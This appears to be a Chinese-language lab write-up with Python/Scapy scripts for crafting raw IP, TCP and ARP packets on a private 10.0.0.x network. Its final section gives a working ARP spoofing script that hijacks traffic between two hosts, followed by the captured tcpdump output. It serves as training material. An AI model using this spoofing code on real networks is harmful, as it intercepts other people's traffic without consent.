<h3 id="2-9-Manually-send-an-Internet-Protocol-packet"><a href="#2-9-Manually-send-an-Internet-Protocol-packet" class="headerlink" title="2.9 Manually send an Internet Protocol packet"></a>2.9 Manually send an Internet Protocol packet</h3><p>这里的问题是，默认情况下，<code>sock.sendto(packet, (dst_ip, 0))</code> 发送的 IP 数据包会通过系统的路由表决定从哪个网络接口发送，但当前环境是无妨访问网络的，主机默认使用eth0网络接口与外界通信，所以组装好的IP数据包要发送到eth0网络接口上：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算IP头部校验和</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checksum</span>(<span class="params">data</span>):</span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">2</span>):</span><br><span class="line">        w = (data[i] &lt;&lt; <span class="number">8</span>) + (data[i + <span class="number">1</span>])</span><br><span class="line">        s = s + w</span><br><span class="line">    s = (s &gt;&gt; <span class="number">16</span>) + (s &amp; <span class="number">0xffff</span>)</span><br><span class="line">    s = ~s &amp; <span class="number">0xffff</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造IP头部</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">construct_ip_header</span>(<span class="params">src_ip, dst_ip, proto</span>):</span><br><span class="line">    ip_ver = <span class="number">4</span></span><br><span class="line">    ip_ihl = <span class="number">5</span></span><br><span class="line">    ip_ver_ihl = (ip_ver &lt;&lt; <span class="number">4</span>) + ip_ihl</span><br><span class="line">    ip_dscp_ecn = <span class="number">0</span></span><br><span class="line">    ip_tot_len = <span class="number">20</span> + <span class="number">8</span></span><br><span class="line">    ip_id = <span class="number">54321</span></span><br><span class="line">    ip_frag_off = <span class="number">0</span></span><br><span class="line">    ip_ttl = <span class="number">64</span></span><br><span class="line">    ip_proto = proto</span><br><span class="line">    ip_check = <span class="number">0</span></span><br><span class="line">    ip_src = socket.inet_aton(src_ip)</span><br><span class="line">    ip_dst = socket.inet_aton(dst_ip)</span><br><span class="line"></span><br><span class="line">    ip_header = struct.pack(<span class="string">&#x27;!BBHHHBBH4s4s&#x27;</span>,</span><br><span class="line">                            ip_ver_ihl, ip_dscp_ecn, ip_tot_len, ip_id, ip_frag_off,</span><br><span class="line">                            ip_ttl, ip_proto, ip_check, ip_src, ip_dst)</span><br><span class="line">    ip_check = checksum(ip_header)</span><br><span class="line">    ip_header = struct.pack(<span class="string">&#x27;!BBHHHBBH4s4s&#x27;</span>,</span><br><span class="line">                            ip_ver_ihl, ip_dscp_ecn, ip_tot_len, ip_id, ip_frag_off,</span><br><span class="line">                            ip_ttl, ip_proto, ip_check, ip_src, ip_dst)</span><br><span class="line">    <span class="keyword">return</span> ip_header</span><br><span class="line"></span><br><span class="line"><span class="comment"># 本地主机的IP地址</span></span><br><span class="line">src_ip = <span class="string">&quot;10.0.0.2&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标主机的IP地址</span></span><br><span class="line">dst_ip = <span class="string">&quot;10.0.0.3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># IP协议字段设置为0xFF</span></span><br><span class="line">proto = <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造IP头部</span></span><br><span class="line">ip_header = construct_ip_header(src_ip, dst_ip, proto)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据负载 (可选)</span></span><br><span class="line">payload = <span class="string">b&quot;Hello, IP Protocol 0xFF&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 最终数据包</span></span><br><span class="line">packet = ip_header + payload</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建原始套接字</span></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绑定到eth0接口</span></span><br><span class="line">sock.setsockopt(socket.SOL_SOCKET, <span class="number">25</span>, <span class="string">b&#x27;eth0&#x27;</span> + <span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送IP数据包</span></span><br><span class="line">sock.sendto(packet, (dst_ip, <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;IP packet sent to 10.0.0.3 with IP protocol 0xFF&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-10-Manually-send-a-Transmission-Control-Protocol-packet"><a href="#2-10-Manually-send-a-Transmission-Control-Protocol-packet" class="headerlink" title="2.10 Manually send a Transmission Control Protocol packet"></a>2.10 Manually send a Transmission Control Protocol packet</h3><p>使用python构建一个TCP 包，然后将socket绑定到eth0上发送</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checksum</span>(<span class="params">msg</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    计算TCP头部的校验和。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    <span class="comment"># 每次处理两个字节</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(msg), <span class="number">2</span>):</span><br><span class="line">        w = (msg[i] &lt;&lt; <span class="number">8</span>) + (msg[i + <span class="number">1</span>])</span><br><span class="line">        s = s + w</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 处理进位</span></span><br><span class="line">    s = (s &gt;&gt; <span class="number">16</span>) + (s &amp; <span class="number">0xffff</span>)</span><br><span class="line">    s = s + (s &gt;&gt; <span class="number">16</span>)</span><br><span class="line">    <span class="comment"># 取反并只保留低16位</span></span><br><span class="line">    s = ~s &amp; <span class="number">0xffff</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_tcp_packet</span>(<span class="params">source_ip, dest_ip, source_port, dest_port, seq, ack_seq, flags, user_data=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    创建一个TCP包。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    doff = <span class="number">5</span>  <span class="comment"># 数据偏移量，表示头部长度（5 * 4 = 20字节）</span></span><br><span class="line">    window = socket.htons(<span class="number">5840</span>)  <span class="comment"># 窗口大小，最大允许窗口大小</span></span><br><span class="line">    urg_ptr = <span class="number">0</span>  <span class="comment"># 紧急指针（通常为0）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解析TCP标志位</span></span><br><span class="line">    urg = (flags &amp; <span class="number">0x20</span>) &gt;&gt; <span class="number">5</span></span><br><span class="line">    ack = (flags &amp; <span class="number">0x10</span>) &gt;&gt; <span class="number">4</span></span><br><span class="line">    psh = (flags &amp; <span class="number">0x08</span>) &gt;&gt; <span class="number">3</span></span><br><span class="line">    rst = (flags &amp; <span class="number">0x04</span>) &gt;&gt; <span class="number">2</span></span><br><span class="line">    syn = (flags &amp; <span class="number">0x02</span>) &gt;&gt; <span class="number">1</span></span><br><span class="line">    fin = flags &amp; <span class="number">0x01</span></span><br><span class="line"></span><br><span class="line">    offset_res = (doff &lt;&lt; <span class="number">4</span>) + <span class="number">0</span>  <span class="comment"># 数据偏移量和保留位</span></span><br><span class="line">    tcp_flags = fin + (syn &lt;&lt; <span class="number">1</span>) + (rst &lt;&lt; <span class="number">2</span>) + (psh &lt;&lt; <span class="number">3</span>) + (ack &lt;&lt; <span class="number">4</span>) + (urg &lt;&lt; <span class="number">5</span>)  <span class="comment"># 组合TCP标志位</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建TCP头部</span></span><br><span class="line">    tcp_header = struct.pack(<span class="string">&#x27;!HHLLBBHHH&#x27;</span>, source_port, dest_port, seq, ack_seq, offset_res, tcp_flags, window, <span class="number">0</span>, urg_ptr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造伪头部，用于校验和计算</span></span><br><span class="line">    source_ip = socket.inet_aton(source_ip)  <span class="comment"># 源IP地址</span></span><br><span class="line">    dest_ip = socket.inet_aton(dest_ip)      <span class="comment"># 目标IP地址</span></span><br><span class="line">    placeholder = <span class="number">0</span>  <span class="comment"># 占位符</span></span><br><span class="line">    protocol = socket.IPPROTO_TCP  <span class="comment"># 协议类型（TCP）</span></span><br><span class="line">    tcp_length = <span class="built_in">len</span>(tcp_header) + <span class="built_in">len</span>(user_data)  <span class="comment"># TCP包长度</span></span><br><span class="line"></span><br><span class="line">    pseudo_header = struct.pack(<span class="string">&#x27;!4s4sBBH&#x27;</span>, source_ip, dest_ip, placeholder, protocol, tcp_length)</span><br><span class="line">    pseudo_header = pseudo_header + tcp_header + user_data.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算TCP校验和</span></span><br><span class="line">    tcp_checksum = checksum(pseudo_header)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 重新打包TCP头部，包含校验和</span></span><br><span class="line">    tcp_header = struct.pack(<span class="string">&#x27;!HHLLBBH&#x27;</span>, source_port, dest_port, seq, ack_seq, offset_res, tcp_flags, window) + struct.pack(<span class="string">&#x27;H&#x27;</span>, tcp_checksum) + struct.pack(<span class="string">&#x27;!H&#x27;</span>, urg_ptr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tcp_header + user_data.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建原始套接字</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)</span><br><span class="line"><span class="keyword">except</span> socket.error <span class="keyword">as</span> msg:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;无法创建套接字。错误代码 : <span class="subst">&#123;msg[<span class="number">0</span>]&#125;</span> 错误信息: <span class="subst">&#123;msg[<span class="number">1</span>]&#125;</span>&#x27;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绑定到eth0接口</span></span><br><span class="line">s.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, <span class="string">b&#x27;eth0\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">source_ip = <span class="string">&#x27;10.0.0.2&#x27;</span>  <span class="comment"># 源IP地址（根据需要修改）</span></span><br><span class="line">dest_ip = <span class="string">&#x27;10.0.0.3&#x27;</span>    <span class="comment"># 目标IP地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># TCP包的字段</span></span><br><span class="line">source_port = <span class="number">31337</span></span><br><span class="line">dest_port = <span class="number">31337</span></span><br><span class="line">seq = <span class="number">31337</span></span><br><span class="line">ack_seq = <span class="number">31337</span></span><br><span class="line">flags = <span class="number">0x1F</span>  <span class="comment"># 标志位对应APRSF (ACK=0x10, PSH=0x08, RST=0x04, SYN=0x02, FIN=0x01)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造TCP包</span></span><br><span class="line">tcp_packet = create_tcp_packet(source_ip, dest_ip, source_port, dest_port, seq, ack_seq, flags)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送数据包</span></span><br><span class="line">s.sendto(tcp_packet, (dest_ip, dest_port))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;数据包已通过eth0发送到 <span class="subst">&#123;dest_ip&#125;</span>:<span class="subst">&#123;dest_port&#125;</span>，标志位为APRSF。&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-11-Manually-perform-a-Transmission-Control-Protocol-handshake"><a href="#2-11-Manually-perform-a-Transmission-Control-Protocol-handshake" class="headerlink" title="2.11 Manually perform a Transmission Control Protocol handshake"></a>2.11 Manually perform a Transmission Control Protocol handshake</h3><p>这里要完成一个TCP的handshake操作，当我们运行下面的代码后会发现输出：</p>
<blockquote>
<p>root@ip-10-0-0-2:~# python BaWS&#x2F;I2C&#x2F;2_11.py<br>Sending SYN packet: IP &#x2F; TCP 10.0.0.2:31337 &gt; 10.0.0.3:31337 S<br>WARNING: No route found (no default route?)<br>Begin emission:<br>WARNING: No route found (no default route?)<br>WARNING: more No route found (no default route?)</p>
</blockquote>
<p>提示我们网络接口配置配置有问题，通过ifconfig命令发现，eth0接口没有配置ipv4地址，手动配置<code>ip addr add 10.0.0.2/24 dev eth0</code>：</p>
<blockquote>
<p>root@ip-10-0-0-2:~# ifconfig eth0: flags&#x3D;4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet6 fe80::8c96:7bff:fe9c:4172 prefixlen 64 scopeid 0x20 ether 8e:96:7b:9c:41:72 txqueuelen 1000 (Ethernet) RX packets 49 bytes 3802 (3.7 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 16 bytes 1172 (1.1 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0</p>
<p>lo: flags&#x3D;73&lt;UP,LOOPBACK,RUNNING&gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10 loop txqueuelen 1000 (Local Loopback) RX packets 11 bytes 440 (440.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 11 bytes 440 (440.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置源和目标信息</span></span><br><span class="line">source_ip = <span class="string">&#x27;10.0.0.2&#x27;</span>  <span class="comment"># 本地IP地址（根据实际情况修改）</span></span><br><span class="line">dest_ip = <span class="string">&#x27;10.0.0.3&#x27;</span>    <span class="comment"># 目标IP地址</span></span><br><span class="line">source_port = <span class="number">31337</span>  <span class="comment"># 源端口</span></span><br><span class="line">dest_port = <span class="number">31337</span>  <span class="comment"># 目标端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定要使用的网络接口</span></span><br><span class="line"><span class="comment"># conf.iface = &quot;eth0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 发送SYN包</span></span><br><span class="line">syn = IP(src=source_ip, dst=dest_ip) / TCP(sport=source_port, dport=dest_port, flags=<span class="string">&#x27;S&#x27;</span>, seq=<span class="number">31337</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Sending SYN packet: <span class="subst">&#123;syn.summary()&#125;</span>&quot;</span>)</span><br><span class="line">syn_ack = sr1(syn, timeout=<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> syn_ack <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No SYN-ACK received. The target might be unreachable or blocked by a firewall.&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 尝试捕获收到的所有包</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Sniffing for packets...&quot;</span>)</span><br><span class="line">    sniffed_packets = sniff(iface=<span class="string">&quot;eth0&quot;</span>, count=<span class="number">10</span>, timeout=<span class="number">100</span>)  <span class="comment"># 捕获最多10个包，或等待10秒</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sniffed_packets) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> packet <span class="keyword">in</span> sniffed_packets:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Captured a packet:&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(packet.show())  <span class="comment"># 显示每个数据包的详细结构</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;No packets captured.&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;收到SYN-ACK包，序列号: <span class="subst">&#123;syn_ack.seq&#125;</span>, 确认号: <span class="subst">&#123;syn_ack.ack&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 发送ACK包</span></span><br><span class="line">    ack = IP(src=source_ip, dst=dest_ip) / TCP(sport=source_port, dport=dest_port, flags=<span class="string">&#x27;A&#x27;</span>, seq=syn_ack.ack, ack=syn_ack.seq + <span class="number">1</span>)</span><br><span class="line">    send(ack)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;ACK包已发送到 <span class="subst">&#123;dest_ip&#125;</span>:<span class="subst">&#123;dest_port&#125;</span> via <span class="subst">&#123;conf.iface&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-12-Manually-send-an-Address-Resolution-Protocol-packet"><a href="#2-12-Manually-send-an-Address-Resolution-Protocol-packet" class="headerlink" title="2.12 Manually send an Address Resolution Protocol packet"></a>2.12 Manually send an Address Resolution Protocol packet</h3><p>这个也是一样的，要先通过<code>ip addr add 10.0.0.2/24 dev eth0</code>设置网络接口的ipv4地址，然后执行脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义发送方的MAC地址和IP地址</span></span><br><span class="line">sender_mac = <span class="string">&quot;4e:d3:8e:16:1f:7e&quot;</span>  <span class="comment"># 发送方的MAC地址（可以根据实际情况更改）</span></span><br><span class="line">sender_ip = <span class="string">&quot;10.0.0.2&quot;</span>  <span class="comment"># 发送方的IP地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义目标主机的IP地址</span></span><br><span class="line">target_ip = <span class="string">&quot;10.0.0.3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建ARP包</span></span><br><span class="line">arp_packet = ARP(op=<span class="string">&quot;is-at&quot;</span>, hwsrc=sender_mac, psrc=sender_ip, pdst=target_ip)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送ARP包</span></span><br><span class="line">send(arp_packet)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;ARP包已发送到 <span class="subst">&#123;target_ip&#125;</span>，告知其 <span class="subst">&#123;sender_ip&#125;</span> 的MAC地址是 <span class="subst">&#123;sender_mac&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-13-Hijack-traffic-from-a-remote-host-using-ARP"><a href="#2-13-Hijack-traffic-from-a-remote-host-using-ARP" class="headerlink" title="2.13 Hijack traffic from a remote host using ARP"></a>2.13 Hijack traffic from a remote host using ARP</h3><p>一开始我们使用tcpdump -i eth0 监听本机网络接口eth0上是得不到任何数据的。现在执行ARP欺诈：</p>
<p><strong>构造 ARP 响应包</strong>:</p>
<ul>
<li><code>ARP(op=2, ...)</code> 构造了一个 ARP 响应包，其中 <code>op=2</code> 表示这是一个 ARP 回复（即 “is-at”）。</li>
<li><code>pdst=target_ip</code> 设置了目标主机的 IP 地址，即这个 ARP 包将发送到哪个 IP 地址。</li>
<li><code>hwdst=getmacbyip(target_ip)</code> 获取目标主机的 MAC 地址，并将其设置为 ARP 包中的目标硬件地址（即目标 MAC 地址）。</li>
<li><code>psrc=spoof_ip</code> 设置了伪装的 IP 地址，告诉目标主机这个 IP 地址现在与发送者的 MAC 地址相关联。</li>
<li><code>hwsrc=my_mac</code> 设置了发送者的 MAC 地址（攻击者的 MAC 地址），这是你希望目标主机将 <code>spoof_ip</code> 关联的地址。</li>
</ul>
<p><strong>发送 ARP 包</strong>:</p>
<ul>
<li><code>send(arp_response, verbose=False)</code> 发送这个伪造的 ARP 响应包。<code>verbose=False</code> 表示在发送时不输出详细信息。</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标主机信息</span></span><br><span class="line">target1_ip = <span class="string">&quot;10.0.0.4&quot;</span>  <span class="comment"># 远程主机1</span></span><br><span class="line">target2_ip = <span class="string">&quot;10.0.0.2&quot;</span>  <span class="comment"># 远程主机2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 本地主机信息</span></span><br><span class="line">my_mac = <span class="string">&quot;c2:fa:63:2e:21:fb&quot;</span>  <span class="comment"># 替换为你的实际MAC地址</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arp_spoof</span>(<span class="params">target_ip, spoof_ip</span>):</span><br><span class="line">    arp_response = ARP(op=<span class="number">2</span>, pdst=target_ip, hwdst=getmacbyip(target_ip), psrc=spoof_ip, hwsrc=my_mac)</span><br><span class="line">    send(arp_response, verbose=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restore_arp</span>(<span class="params">target_ip, real_mac, spoof_ip</span>):</span><br><span class="line">    arp_response = ARP(op=<span class="number">2</span>, pdst=target_ip, hwdst=real_mac, psrc=spoof_ip, hwsrc=getmacbyip(spoof_ip))</span><br><span class="line">    send(arp_response, count=<span class="number">4</span>, verbose=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] 开始 ARP 欺骗... 按 Ctrl+C 停止.&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        arp_spoof(target1_ip, target2_ip)</span><br><span class="line">        arp_spoof(target2_ip, target1_ip)</span><br><span class="line">        time.sleep(<span class="number">2</span>)  <span class="comment"># 每2秒发送一次</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] 停止 ARP 欺骗，恢复网络设置...&quot;</span>)</span><br><span class="line">    restore_arp(target1_ip, getmacbyip(target1_ip), target2_ip)</span><br><span class="line">    restore_arp(target2_ip, getmacbyip(target2_ip))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 完成.&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>之后再次监听eth0会得到：</p>
<blockquote>
<p>oot@ip-10-0-0-3:~# tcpdump -i eth0<br>tcpdump: verbose output suppressed, use -v[v]… for full protocol decode<br>listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes<br>12:19:48.138491 IP 10.0.0.2.31337 &gt; 10.0.0.4.42118: Flags [S.], seq 1016474819, ack 1875635199, win 65160, options [mss 1460,sackOK,TS val 3852132867 ecr 3986586317,nop,wscale 7], length 0<br>12:19:48.138517 IP 10.0.0.2.31337 &gt; 10.0.0.4.42118: Flags [S.], seq 1016474819, ack 1875635199, win 65160, options [mss 1460,sackOK,TS val 3852132867 ecr 3986586317,nop,wscale 7], length 0<br>12:19:52.302521 IP 10.0.0.2.31337 &gt; 10.0.0.4.421</p>
</blockquote>
<p>最后通过下面的代码获取捕捉到的包的内容</p>
